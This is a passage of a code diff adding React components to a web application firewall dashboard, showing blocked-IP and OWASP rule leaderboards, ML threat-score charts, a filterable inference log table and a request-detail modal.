+                      <span style={{ fontFamily: 'monospace', color: '#3b82f6', fontWeight: 500 }}>{ipObj.ip}</span>
+                    </div>
+                    <span style={{ fontWeight: 600, color: '#ef4444' }}>{ipObj.count} blocks</span>
+                  </div>
+                  <div style={{ width: '100%', height: '6px', background: 'rgba(255,255,255,0.03)', borderRadius: '3px', overflow: 'hidden' }}>
+                    <div style={{
+                      width: `${Math.min((ipObj.count / (topIPs[0]?.count || 1)) * 100, 100)}%`,
+                      height: '100%',
+                      background: 'linear-gradient(90deg, #3b82f6, #ef4444)',
+                      borderRadius: '3px'
+                    }}></div>
+                  </div>
+                </div>
+              ))
+            )}
+          </div>
+        </div>
+      </div>
+
+      {/* Most Triggered Rule IDs List */}
+      <div className="chart-card glass-panel" style={{ gridColumn: 'span 3' }}>
+        <div className="card-title">
+          <ShieldAlert size={18} color="#ef4444" />
+          Most Active OWASP Rules
+        </div>
+        <div className="chart-container" style={{ minHeight: '320px' }}>
+          <div className="rules-triggered-list" style={{ height: '100%', justifyContent: 'center', display: 'flex', flexDirection: 'column' }}>
+            {topRules.length === 0 ? (
+              <div style={{ textAlign: 'center', color: '#a1a1aa', fontSize: '13px' }}>No rules triggered yet.</div>
+            ) : (
+              topRules.map((ruleObj) => (
+                <div key={ruleObj.rule_id} className="rule-triggered-item">
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                    <span className="rule-badge">{ruleObj.rule_id}</span>
+                    <span style={{ fontSize: '12px', color: '#a1a1aa' }}>OWASP CRS</span>
+                  </div>
+                  <span style={{ fontWeight: 600, fontSize: '13px', color: '#fde047' }}>{ruleObj.count} hits</span>
+                </div>
+              ))
+            )}
+          </div>
+        </div>
+      </div>
+    </motion.div>
+  );
+}
+
+function MLAnalytics() {
+  const [stats, setStats] = useState({
+    total_evaluations: 0,
+    decision_breakdown: { allow: 0, block: 0, rate_limit: 0, log: 0 },
+    avg_threat_score: 0.0,
+    top_anomalous_uris: [],
+    top_anomalous_ips: []
+  });
+  const [logs, setLogs] = useState([]);
+  const [totalLogs, setTotalLogs] = useState(0);
+  const [page, setPage] = useState(1);
+  const [size] = useState(10);
+  const [timeline, setTimeline] = useState([]);
+  const [loading, setLoading] = useState(true);
+  const [filterDecision, setFilterDecision] = useState('');
+  const [searchQuery, setSearchQuery] = useState('');
+  const [selectedLog, setSelectedLog] = useState(null);
+  const [refreshInterval, setRefreshInterval] = useState(3000);
+  const [autoRefresh, setAutoRefresh] = useState(true);
+  const [copied, setCopied] = useState(false);
+
+  useEffect(() => {
+    if (copied) {
+      const t = setTimeout(() => setCopied(false), 2000);
+      return () => clearTimeout(t);
+    }
+  }, [copied]);
+
+  const handleCopy = () => {
+    if (!selectedLog) return;
+    const textToCopy = JSON.stringify(selectedLog, null, 2);
+
+    if (navigator.clipboard && window.isSecureContext) {
+      navigator.clipboard.writeText(textToCopy)
+        .then(() => setCopied(true))
+        .catch(err => console.error("Copy failed", err));
+    } else {
+      try {
+        const textArea = document.createElement("textarea");
+        textArea.value = textToCopy;
+        textArea.style.position = "fixed";
+        textArea.style.left = "-999999px";
+        document.body.appendChild(textArea);
+        textArea.focus();
+        textArea.select();
+        const successful = document.execCommand('copy');
+        document.body.removeChild(textArea);
+        if (successful) setCopied(true);
+      } catch (err) {
+        console.error("Fallback copy error", err);
+      }
+    }
+  };
+
+  const fetchMLData = async () => {
+    try {
+      const statsData = await getMLStats();
+      if (statsData && !statsData.error) {
+        setStats(statsData);
+      }
+      
+      const filters = {};
+      if (filterDecision) filters.decision = filterDecision;
+      if (searchQuery) filters.search = searchQuery;
+      
+      const logsData = await getMLLogs(page, size, filters);
+      if (logsData && !logsData.error) {
+        setLogs(logsData.data || []);
+        setTotalLogs(logsData.total || 0);
+      }
+
+      const timelineData = await getMLTimeline();
+      if (timelineData && !timelineData.error) {
+        setTimeline(timelineData.data || []);
+      }
+    } catch (err) {
+      console.error("Error fetching ML analytics data:", err);
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      fetchMLData();
+    }, 0);
+    return () => clearTimeout(timer);
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [page, filterDecision, searchQuery]);
+
+  useEffect(() => {
+    if (!autoRefresh) return;
+    const interval = setInterval(() => {
+      fetchMLData();
+    }, refreshInterval);
+    return () => clearInterval(interval);
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [autoRefresh, refreshInterval, page, filterDecision, searchQuery]);
+
+  const decisionColors = {
+    allow: '#10b981',
+    log: '#3b82f6',
+    rate_limit: '#f59e0b',
+    block: '#ef4444'
+  };
+
+  const pieData = Object.entries(stats.decision_breakdown).map(([name, value]) => ({
+    name: name.toUpperCase().replace('_', ' '),
+    value,
+    color: decisionColors[name] || '#6b7280'
+  })).filter(item => item.value > 0);
+
+  const hasPieData = pieData.length > 0;
+  const displayPieData = hasPieData ? pieData : [
+    { name: 'NO DATA', value: 1, color: '#4b5563' }
+  ];
+
+  return (
+    <motion.div
+      className="dashboard-grid animate-fade-in"
+      initial={{ opacity: 0, y: 10 }}
+      animate={{ opacity: 1, y: 0 }}
+      transition={{ duration: 0.4 }}
+    >
+      {/* Dynamic Controls Header inside the grid to span full width */}
+      <div className="glass-panel" style={{ gridColumn: 'span 12', padding: '16px 24px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '16px' }}>
+        <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
+          <Brain size={24} color="#6366f1" style={{ filter: 'drop-shadow(0 0 8px rgba(99, 102, 241, 0.5))' }} />
+          <div>
+            <span style={{ fontSize: '13px', color: 'var(--text-secondary)' }}>Status: </span>
+            <strong style={{ fontSize: '13px', color: 'var(--success-color)' }}>Predictive Protection Shields Active</strong>
+          </div>
+        </div>
+        
+        <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
+          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+            <span style={{ fontSize: '13px', color: 'var(--text-secondary)' }}>Auto Refresh:</span>
+            <input
+              type="checkbox"
+              checked={autoRefresh}
+              onChange={(e) => setAutoRefresh(e.target.checked)}
+              style={{ cursor: 'pointer', width: '16px', height: '16px' }}
+            />
+          </div>
+          
+          <select
+            value={refreshInterval}
+            onChange={(e) => setRefreshInterval(Number(e.target.value))}
+            disabled={!autoRefresh}
+            className="filter-select"
+            style={{ padding: '6px 12px' }}
+          >
+            <option value={1000}>1s Refresh</option>
+            <option value={3000}>3s Refresh</option>
+            <option value={5000}>5s Refresh</option>
+            <option value={10000}>10s Refresh</option>
+          </select>
+          
+          <button 
+            className="modal-btn primary"
+            onClick={fetchMLData}
+            style={{ padding: '6px 14px', borderRadius: '8px' }}
+          >
+            <Activity size={14} /> Force Sync
+          </button>
+        </div>
+      </div>
+
+      {/* Metric Cards Grid */}
+      <div className="metric-card glass-panel" style={{ gridColumn: 'span 3' }}>
+        <div className="metric-header">
+          <span>AI Evaluations</span>
+          <div className="metric-icon-wrapper blue"><Brain size={18} /></div>
+        </div>
+        <div className="metric-value">{stats.total_evaluations.toLocaleString()}</div>
+        <div className="metric-trend trend-down">
+          <Clock size={12} /> <span>Real-time capture</span>
+        </div>
+      </div>
+
+      <div className="metric-card glass-panel" style={{ gridColumn: 'span 3' }}>
+        <div className="metric-header">
+          <span>Avg Threat Score</span>
+          <div className="metric-icon-wrapper blue" style={{ color: 'var(--accent-color)', background: 'var(--accent-bg)' }}><Activity size={18} /></div>
+        </div>
+        <div className="metric-value" style={{ color: 'var(--accent-color)' }}>{(stats.avg_threat_score * 100).toFixed(1)}%</div>
+        <div className="metric-trend trend-down">
+          <span>Overall anomaly ratio</span>
+        </div>
+      </div>
+
+      <div className="metric-card glass-panel" style={{ gridColumn: 'span 3' }}>
+        <div className="metric-header">
+          <span>Blocks Executed</span>
+          <div className="metric-icon-wrapper red"><ShieldAlert size={18} /></div>
+        </div>
+        <div className="metric-value" style={{ color: 'var(--danger-color)' }}>{stats.decision_breakdown.block.toLocaleString()}</div>
+        <div className="metric-trend trend-up">
+          <span>
+            {stats.total_evaluations > 0
+              ? ((stats.decision_breakdown.block / stats.total_evaluations) * 100).toFixed(1)
+              : 0}% block rate
+          </span>
+        </div>
+      </div>
+
+      <div className="metric-card glass-panel" style={{ gridColumn: 'span 3' }}>
+        <div className="metric-header">
+          <span>Rate Limited</span>
+          <div className="metric-icon-wrapper orange"><Lock size={18} /></div>
+        </div>
+        <div className="metric-value" style={{ color: 'var(--warning-color)' }}>{stats.decision_breakdown.rate_limit.toLocaleString()}</div>
+        <div className="metric-trend trend-up">
+          <span>
+            {stats.total_evaluations > 0
+              ? ((stats.decision_breakdown.rate_limit / stats.total_evaluations) * 100).toFixed(1)
+              : 0}% rate limits
+          </span>
+        </div>
+      </div>
+
+      {/* Decision Threshold Banner */}
+      <div className="chart-card glass-panel" style={{ gridColumn: 'span 12', padding: '24px' }}>
+        <div className="card-title" style={{ marginBottom: '16px' }}>
+          <SettingsIcon size={18} color="var(--accent-color)" />
+          Hybrid Decision Matrix Routing Thresholds
+        </div>
+        
+        <div style={{ display: 'flex', width: '100%', height: '32px', borderRadius: '8px', overflow: 'hidden', background: 'rgba(255,255,255,0.02)', border: '1px solid var(--border-color)', marginBottom: '16px', fontSize: '12px', fontWeight: 600, textAlign: 'center', lineHeight: '32px' }}>
+          <div style={{ width: '40%', background: 'rgba(16, 185, 129, 0.15)', borderRight: '1px solid rgba(16, 185, 129, 0.3)', color: 'var(--success-color)' }}>ALLOW (Score &lt; 40%)</div>
+          <div style={{ width: '30%', background: 'rgba(99, 102, 241, 0.15)', borderRight: '1px solid rgba(99, 102, 241, 0.3)', color: 'var(--accent-color)' }}>LOG (40% - 70%)</div>
+          <div style={{ width: '15%', background: 'rgba(245, 158, 11, 0.15)', borderRight: '1px solid rgba(245, 158, 11, 0.3)', color: 'var(--warning-color)' }}>LIMIT (70% - 85%)</div>
+          <div style={{ width: '15%', background: 'rgba(244, 63, 94, 0.15)', color: 'var(--danger-color)' }}>BLOCK (&gt;= 85%)</div>
+        </div>
+        
+        <div style={{ display: 'flex', justifyContent: 'space-between', color: 'var(--text-secondary)', fontSize: '13px', flexWrap: 'wrap', gap: '8px' }}>
+          <span>ℹ️ Scores combine CRS signatures (50%), XGBoost classification (30%), Isolation Forest novelty (20%), and Redis reputation.</span>
+          <span style={{ color: 'var(--accent-color)', fontWeight: 500 }}>Engine: Active (FastAPI Daemon)</span>
+        </div>
+      </div>
+
+      {/* Visual Analytics Row */}
+      {/* Timeline Chart */}
+      <div className="chart-card glass-panel" style={{ gridColumn: 'span 8' }}>
+        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '24px' }}>
+          <div className="card-title" style={{ marginBottom: 0 }}>
+            <Activity size={18} color="var(--accent-color)" />
+            Threat Score Timeline Trends
+          </div>
+          <div className="pulse-container">
+            <div className="pulse-dot"></div>
+            <span>Live Sync</span>
+          </div>
+        </div>
+        
+        <div className="chart-container" style={{ minHeight: '280px' }}>
+          {timeline.length > 0 ? (
+            <ResponsiveContainer width="100%" height="100%">
+              <ComposedChart data={timeline} margin={{ top: 10, right: 15, left: -15, bottom: 0 }}>
+                <defs>
+                  <linearGradient id="mlThreatScoreGrad" x1="0" y1="0" x2="0" y2="1">
+                    <stop offset="5%" stopColor="var(--danger-color)" stopOpacity={0.35} />
+                    <stop offset="95%" stopColor="var(--danger-color)" stopOpacity={0.0} />
+                  </linearGradient>
+                </defs>
+                <CartesianGrid strokeDasharray="3 3" stroke="rgba(255,255,255,0.05)" vertical={false} />
+                <XAxis
+                  dataKey="time_bucket"
+                  tickFormatter={(val) => {
+                    try {
+                      return val.split(' ')[1].slice(0, 5); // Display HH:MM
+                    } catch {
+                      return val;
+                    }
+                  }}
+                  stroke="var(--text-secondary)"
+                  fontSize={11}
+                  tickLine={false}
+                  axisLine={false}
+                  interval="preserveStartEnd"
+                  minTickGap={50}
+                />
+                {/* Left YAxis: Threat Score */}
+                <YAxis
+                  yAxisId="left"
+                  domain={[0, 1]}
+                  tickFormatter={(val) => `${(val * 100).toFixed(0)}%`}
+                  stroke="var(--text-secondary)"
+                  fontSize={11}
+                  tickLine={false}
+                  axisLine={false}
+                />
+                {/* Right YAxis: Request Count */}
+                <YAxis
+                  yAxisId="right"
+                  orientation="right"
+                  stroke="var(--text-secondary)"
+                  fontSize={11}
+                  tickLine={false}
+                  axisLine={false}
+                  allowDecimals={false}
+                />
+                <RechartsTooltip
+                  contentStyle={{
+                    background: 'var(--bg-secondary)',
+                    border: '1px solid var(--border-color)',
+                    borderRadius: '12px',
+                    color: 'var(--text-primary)',
+                    fontFamily: 'inherit',
+                    boxShadow: '0 10px 25px rgba(0,0,0,0.5)'
+                  }}
+                  labelFormatter={(label) => `Time: ${label}`}
+                  formatter={(value, name) => [
+                    name === 'avg_score' ? `${(value * 100).toFixed(1)}%` : value,
+                    name === 'avg_score' ? 'Avg Threat' : 'Request Count'
+                  ]}
+                />
+                {/* Request Count Bar in the background */}
+                <Bar
+                  yAxisId="right"
+                  dataKey="count"
+                  name="Request Count"
+                  fill="rgba(99, 102, 241, 0.12)"
+                  stroke="rgba(99, 102, 241, 0.35)"
+                  strokeWidth={1}
+                  barSize={18}
+                  radius={[4, 4, 0, 0]}
+                />
+                {/* Avg Threat Score Area in the foreground */}
+                <Area
+                  yAxisId="left"
+                  type="monotone"
+                  dataKey="avg_score"
+                  name="Avg Threat"
+                  stroke="var(--danger-color)"
+                  strokeWidth={2.5}
+                  fillOpacity={1}
+                  fill="url(#mlThreatScoreGrad)"
+                />
+              </ComposedChart>
+            </ResponsiveContainer>
+          ) : (
+            <div style={{ display: 'flex', height: '100%', alignItems: 'center', justifyContent: 'center', color: 'var(--text-secondary)', fontSize: '14px' }}>
+              Waiting for ML evaluation requests to compile graph data...
+            </div>
+          )}
+        </div>
+      </div>
+
+      {/* Pie Actions Share */}
+      <div className="chart-card glass-panel" style={{ gridColumn: 'span 4' }}>
+        <div className="card-title">
+          <Brain size={18} color="var(--accent-color)" />
+          Mitigation Action Shares
+        </div>
+        
+        <div className="chart-container" style={{ display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center' }}>
+          <div style={{ width: '100%', height: '160px' }}>
+            <ResponsiveContainer width="100%" height="100%">
+              <PieChart>
+                <Pie
+                  data={displayPieData}
+                  cx="50%"
+                  cy="50%"
+                  innerRadius={45}
+                  outerRadius={65}
+                  paddingAngle={3}
+                  dataKey="value"
+                >
+                  {displayPieData.map((entry, index) => (
+                    <Cell key={`cell-${index}`} fill={entry.color} />
+                  ))}
+                </Pie>
+                <RechartsTooltip
+                  contentStyle={{
+                    background: 'var(--bg-secondary)',
+                    border: '1px solid var(--border-color)',
+                    borderRadius: '8px',
+                    color: 'var(--text-primary)',
+                    fontFamily: 'inherit'
+                  }}
+                />
+              </PieChart>
+            </ResponsiveContainer>
+          </div>
+          
+          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px 16px', width: '100%', marginTop: '16px', fontSize: '12px' }}>
+            {Object.entries(stats.decision_breakdown).map(([key, val]) => (
+              <div key={key} style={{ display: 'flex', alignItems: 'center', gap: '6px', color: 'var(--text-secondary)' }}>
+                <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: decisionColors[key] }} />
+                <span style={{ textTransform: 'capitalize' }}>{key.replace('_', ' ')}:</span>
+                <strong style={{ color: 'var(--text-primary)', marginLeft: 'auto' }}>{val}</strong>
+              </div>
+            ))}
+          </div>
+        </div>
+      </div>
+
+      {/* Leaderboards */}
+      <div className="chart-card glass-panel" style={{ gridColumn: 'span 6' }}>
+        <div className="card-title">
+          <Globe size={18} color="var(--accent-color)" />
+          Highly Suspect Target Endpoints
+        </div>
+        
+        <div style={{ overflow: 'hidden' }}>
+          {stats.top_anomalous_uris.length > 0 ? (
+            <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '13px' }}>
+              <thead>
+                <tr style={{ borderBottom: '1px solid var(--border-color)', textAlign: 'left', color: 'var(--text-secondary)' }}>
+                  <th style={{ padding: '8px 0', fontSize: '12px', textTransform: 'uppercase', fontWeight: 500 }}>URI Path</th>
+                  <th style={{ padding: '8px 0', textAlign: 'center', fontSize: '12px', textTransform: 'uppercase', fontWeight: 500 }}>Count</th>
+                  <th style={{ padding: '8px 0', textAlign: 'right', fontSize: '12px', textTransform: 'uppercase', fontWeight: 500 }}>Avg Threat</th>
+                </tr>
+              </thead>
+              <tbody>
+                {stats.top_anomalous_uris.map((item, idx) => (
+                  <tr key={idx} style={{ borderBottom: '1px solid rgba(255,255,255,0.02)', color: 'var(--text-primary)' }}>
+                    <td style={{ padding: '10px 0', fontFamily: 'monospace', color: 'var(--accent-color)', maxWidth: '240px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={item.uri}>
+                      {item.uri}
+                    </td>
+                    <td style={{ padding: '10px 0', textAlign: 'center' }}>{item.count}</td>
+                    <td style={{ padding: '10px 0', textAlign: 'right', color: item.avg_score >= 0.7 ? 'var(--danger-color)' : 'var(--warning-color)', fontWeight: 600 }}>
+                      {(item.avg_score * 100).toFixed(0)}%
+                    </td>
+                  </tr>
+                ))}
+              </tbody>
+            </table>
+          ) : (
+            <div style={{ padding: '16px 0', color: 'var(--text-secondary)', textAlign: 'center' }}>No endpoints evaluated yet.</div>
+          )}
+        </div>
+      </div>
+
+      <div className="chart-card glass-panel" style={{ gridColumn: 'span 6' }}>
+        <div className="card-title">
+          <Server size={18} color="var(--accent-color)" />
+          Top Suspect Client IPs
+        </div>
+        
+        <div style={{ overflow: 'hidden' }}>
+          {stats.top_anomalous_ips.length > 0 ? (
+            <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '13px' }}>
+              <thead>
+                <tr style={{ borderBottom: '1px solid var(--border-color)', textAlign: 'left', color: 'var(--text-secondary)' }}>
+                  <th style={{ padding: '8px 0', fontSize: '12px', textTransform: 'uppercase', fontWeight: 500 }}>IP Address</th>
+                  <th style={{ padding: '8px 0', textAlign: 'center', fontSize: '12px', textTransform: 'uppercase', fontWeight: 500 }}>Count</th>
+                  <th style={{ padding: '8px 0', textAlign: 'right', fontSize: '12px', textTransform: 'uppercase', fontWeight: 500 }}>Avg Threat</th>
+                </tr>
+              </thead>
+              <tbody>
+                {stats.top_anomalous_ips.map((item, idx) => (
+                  <tr key={idx} style={{ borderBottom: '1px solid rgba(255,255,255,0.02)', color: 'var(--text-primary)' }}>
+                    <td style={{ padding: '10px 0', fontFamily: 'monospace', color: 'var(--accent-color)' }}>{item.ip}</td>
+                    <td style={{ padding: '10px 0', textAlign: 'center' }}>{item.count}</td>
+                    <td style={{ padding: '10px 0', textAlign: 'right', color: item.avg_score >= 0.7 ? 'var(--danger-color)' : 'var(--warning-color)', fontWeight: 600 }}>
+                      {(item.avg_score * 100).toFixed(0)}%
+                    </td>
+                  </tr>
+                ))}
+              </tbody>
+            </table>
+          ) : (
+            <div style={{ padding: '16px 0', color: 'var(--text-secondary)', textAlign: 'center' }}>No suspicious IPs evaluated yet.</div>
+          )}
+        </div>
+      </div>
+
+      {/* Live Inferences Logs */}
+      <div className="chart-card glass-panel" style={{ gridColumn: 'span 12' }}>
+        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '24px', flexWrap: 'wrap', gap: '12px' }}>
+          <div className="card-title" style={{ marginBottom: 0 }}>
+            <ShieldAlert size={18} color="var(--danger-color)" />
+            Recent AI/ML Evaluation Inferences
+          </div>
+          
+          <div style={{ display: 'flex', gap: '12px' }}>
+            <input
+              type="text"
+              placeholder="Search by URI, IP, variables..."
+              value={searchQuery}
+              onChange={(e) => {
+                setSearchQuery(e.target.value);
+                setPage(1);
+              }}
+              className="search-input"
+              style={{ width: '220px', paddingLeft: '14px' }}
+            />
+            
+            <select
+              value={filterDecision}
+              onChange={(e) => {
+                setFilterDecision(e.target.value);
+                setPage(1);
+              }}
+              className="filter-select"
+            >
+              <option value="">All Actions</option>
+              <option value="allow">Allow Only</option>
+              <option value="log">Log Only</option>
+              <option value="rate_limit">Rate Limit Only</option>
+              <option value="block">Block Only</option>
+            </select>
+          </div>
+        </div>
+
+        {/* Logs Table */}
+        <div className="logs-table-wrapper">
+          <table className="logs-table">
+            <thead>
+              <tr>
+                <th>Timestamp</th>
+                <th>Client IP</th>
+                <th>Request Details</th>
+                <th style={{ textAlign: 'center' }}>XGB Prob</th>
+                <th style={{ textAlign: 'center' }}>Isolation Score</th>
+                <th style={{ textAlign: 'center' }}>Threat Score</th>
+                <th style={{ textAlign: 'center' }}>Action</th>
+              </tr>
+            </thead>
+            <tbody>
+              {logs.length > 0 ? (
+                logs.map((log) => (
+                  <tr 
+                    key={log.id} 
+                    onClick={() => setSelectedLog(log)}
+                    style={{ cursor: 'pointer' }}
+                  >
+                    <td style={{ color: 'var(--text-secondary)', whiteSpace: 'nowrap' }}>
+                      {log.timestamp.replace('T', ' ').split('.')[0]}
+                    </td>
+                    <td style={{ fontFamily: 'monospace', fontWeight: 500 }}>{log.remote_addr}</td>
+                    <td>
+                      <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
+                        <span style={{ fontSize: '10px', fontWeight: 700, padding: '2px 6px', borderRadius: '4px', background: 'rgba(255,255,255,0.05)', color: 'var(--text-secondary)' }}>{log.method}</span>
+                        <span style={{ fontFamily: 'monospace', color: 'var(--accent-color)', maxWidth: '240px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={log.uri}>{log.uri}</span>
+                      </div>
+                    </td>
+                    <td style={{ textAlign: 'center', color: log.xgb_prob >= 0.7 ? 'var(--danger-color)' : 'var(--text-secondary)' }}>
+                      {(log.xgb_prob * 100).toFixed(1)}%
+                    </td>
+                    <td style={{ textAlign: 'center', color: log.iso_score <= -0.1 ? 'var(--warning-color)' : 'var(--text-secondary)' }}>
+                      {log.iso_score.toFixed(3)}
+                    </td>
+                    <td>
+                      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}>
+                        <div style={{ width: '48px', height: '6px', borderRadius: '3px', background: 'rgba(255,255,255,0.05)', overflow: 'hidden' }}>
+                          <div style={{ height: '100%', width: `${log.threat_score * 100}%`, background: decisionColors[log.decision] }} />
+                        </div>
+                        <strong style={{ fontSize: '12px', color: decisionColors[log.decision] }}>{(log.threat_score * 100).toFixed(0)}%</strong>
+                      </div>
+                    </td>
+                    <td style={{ textAlign: 'center' }}>
+                      <span style={{
+                        display: 'inline-block',
+                        padding: '3px 8px',
+                        borderRadius: '12px',
+                        fontSize: '11px',
+                        fontWeight: 600,
+                        textTransform: 'uppercase',
+                        background: `${decisionColors[log.decision]}1A`,
+                        color: decisionColors[log.decision],
+                        border: `1px solid ${decisionColors[log.decision]}40`
+                      }}>
+                        {log.decision.replace('_', ' ')}
+                      </span>
+                    </td>
+                  </tr>
+                ))
+              ) : (
+                <tr>
+                  <td colSpan="7" style={{ textAlign: 'center', padding: '24px 0', color: 'var(--text-secondary)' }}>
+                    {loading ? "Syncing ML engine telemetry database..." : "No inferences recorded yet."}
+                  </td>
+                </tr>
+              )}
+            </tbody>
+          </table>
+        </div>
+
+        {/* Pagination */}
+        {totalLogs > size && (
+          <div className="pagination-container">
+            <span className="pagination-info">
+              Showing {((page - 1) * size) + 1} - {Math.min(page * size, totalLogs)} of {totalLogs} events
+            </span>
+            <div style={{ display: 'flex', gap: '8px' }}>
+              <button
+                disabled={page === 1}
+                onClick={() => setPage(page - 1)}
+                className="pagination-btn"
+              >
+                Prev
+              </button>
+              <button
+                disabled={page * size >= totalLogs}
+                onClick={() => setPage(page + 1)}
+                className="pagination-btn"
+              >
+                Next
+              </button>
+            </div>
+          </div>
+        )}
+      </div>
+
+      {/* View Payload Detail Modal */}
+      {selectedLog && (
+        <div className="modal-overlay" onClick={() => setSelectedLog(null)}>
+          <div className="modal-content" onClick={(e) => e.stopPropagation()} style={{ maxWidth: '680px' }}>
+            <div className="modal-header">
+              <h3 className="modal-title">
+                <Brain size={18} color="var(--accent-color)" />
+                Evaluation Payload Inference Details
+              </h3>
+              <button className="modal-close-btn" onClick={() => setSelectedLog(null)}><X size={18} /></button>
+            </div>
+            
+            <div className="modal-body" style={{ display: 'flex', flexDirection: 'column', gap: '16px', maxHeight: '80vh', overflowY: 'auto' }}>
+              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px', fontSize: '13px' }}>
+                <div>
+                  <span style={{ color: 'var(--text-secondary)', display: 'block', marginBottom: '2px' }}>Timestamp</span>
+                  <strong style={{ color: 'var(--text-primary)' }}>{selectedLog.timestamp.replace('T', ' ')}</strong>
+                </div>
+                <div>
+                  <span style={{ color: 'var(--text-secondary)', display: 'block', marginBottom: '2px' }}>Client IP</span>
+                  <strong style={{ color: 'var(--text-primary)', fontFamily: 'monospace' }}>{selectedLog.remote_addr}</strong>
+                </div>
+                <div>
+                  <span style={{ color: 'var(--text-secondary)', display: 'block', marginBottom: '2px' }}>Request Type</span>
+                  <strong style={{ color: 'var(--text-primary)' }}>{selectedLog.method} - {selectedLog.ct || 'N/A'}</strong>
+                </div>
+                <div>
+                  <span style={{ color: 'var(--text-secondary)', display: 'block', marginBottom: '2px' }}>Body Content Length</span>
+                  <strong style={{ color: 'var(--text-primary)' }}>{selectedLog.body_len} bytes</strong>
+                </div>
+              </div>
+
+              <div style={{ fontSize: '13px' }}>
+                <span style={{ color: 'var(--text-secondary)', display: 'block', marginBottom: '4px' }}>Target Request URI</span>
+                <div style={{ background: 'rgba(0,0,0,0.2)', border: '1px solid var(--border-color)', borderRadius: '6px', padding: '8px 12px', fontFamily: 'monospace', color: 'var(--accent-color)', overflowX: 'auto' }}>
+                  {selectedLog.uri}
+                </div>
+              </div>
+
+              {selectedLog.args && (
+                <div style={{ fontSize: '13px' }}>
+                  <span style={{ color: 'var(--text-secondary)', display: 'block', marginBottom: '4px' }}>Payload Arguments (`args`)</span>
+                  <pre style={{ margin: 0, padding: '8px 12px', background: 'rgba(0,0,0,0.2)', border: '1px solid var(--border-color)', borderRadius: '6px', fontFamily: 'monospace', color: 'var(--warning-color)', overflowX: 'auto', whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
+                    {selectedLog.args}
+                  </pre>
+                </div>
+              )}
+
+              {selectedLog.matched_vars && (
+                <div style={{ fontSize: '13px' }}>
+                  <span style={{ color: 'var(--text-secondary)', display: 'block', marginBottom: '4px' }}>OWASP CRS Rules Matched Variables</span>
+                  <pre style={{ margin: 0, padding: '8px 12px', background: 'rgba(0,0,0,0.2)', border: '1px solid var(--border-color)', borderRadius: '6px', fontFamily: 'monospace', color: 'var(--danger-color)', overflowX: 'auto', whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
+                    {selectedLog.matched_vars}
+                  </pre>
+                </div>
+              )}
+
+              <div style={{ borderTop: '1px solid var(--border-color)', paddingTop: '16px' }}>
+                <span style={{ color: 'var(--text-secondary)', display: 'block', marginBottom: '8px', fontSize: '13px' }}>ML Diagnostics Vector</span>
+                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(120px, 1fr))', gap: '10px', fontSize: '12px', textAlign: 'center' }}>
+                  <div style={{ padding: '8px', background: 'rgba(255,255,255,0.01)', border: '1px solid var(--border-color)', borderRadius: '6px' }}>
+                    <span style={{ color: 'var(--text-secondary)', display: 'block' }}>XGBoost Prob</span>
+                    <strong style={{ color: 'var(--text-primary)', fontSize: '14px' }}>{(selectedLog.xgb_prob * 100).toFixed(1)}%</strong>
+                  </div>
+                  <div style={{ padding: '8px', background: 'rgba(255,255,255,0.01)', border: '1px solid var(--border-color)', borderRadius: '6px' }}>
+                    <span style={{ color: 'var(--text-secondary)', display: 'block' }}>Isolation Forest</span>
+                    <strong style={{ color: 'var(--text-primary)', fontSize: '14px' }}>{selectedLog.iso_score.toFixed(4)}</strong>
+                  </div>
+                  <div style={{ padding: '8px', background: 'rgba(255,255,255,0.01)', border: '1px solid var(--border-color)', borderRadius: '6px' }}>
+                    <span style={{ color: 'var(--text-secondary)', display: 'block' }}>ModSec CRS Anomaly</span>
+                    <strong style={{ color: 'var(--text-primary)', fontSize: '14px' }}>{selectedLog.crs_score}</strong>
+                  </div>
+                  <div style={{ padding: '8px', background: 'rgba(255,255,255,0.01)', border: '1px solid var(--border-color)', borderRadius: '6px' }}>
+                    <span style={{ color: 'var(--text-secondary)', display: 'block' }}>Redis IP Rep</span>
+                    <strong style={{ color: 'var(--text-primary)', fontSize: '14px' }}>{selectedLog.redis_rep} Penalty</strong>
+                  </div>
+                </div>
+              </div>
+
+              <div style={{ borderTop: '1px solid var(--border-color)', paddingTop: '16px' }}>
+                <span style={{ color: 'var(--text-secondary)', display: 'block', marginBottom: '8px', fontSize: '13px' }}>Reconstructed HTTP Request Signature</span>
+                <pre style={{ margin: 0, padding: '12px', background: 'rgba(0,0,0,0.3)', border: '1px solid var(--border-color)', borderRadius: '6px', fontFamily: 'monospace', color: 'var(--accent-color)', overflowX: 'auto', fontSize: '12px', lineHeight: '1.5' }}>
+                  {`${selectedLog.method} ${selectedLog.uri}${selectedLog.args ? `?${selectedLog.args}` : ''} HTTP/1.1\n` +
+                   `Host: localhost\n` +
+                   (selectedLog.ua ? `User-Agent: ${selectedLog.ua}\n` : '') +
+                   (selectedLog.ct ? `Content-Type: ${selectedLog.ct}\n` : '') +
+                   (selectedLog.body_len ? `Content-Length: ${selectedLog.body_len}\n` : '')}
+                </pre>
+              </div>
+
+              <div style={{ borderTop: '1px solid var(--border-color)', paddingTop: '16px' }}>
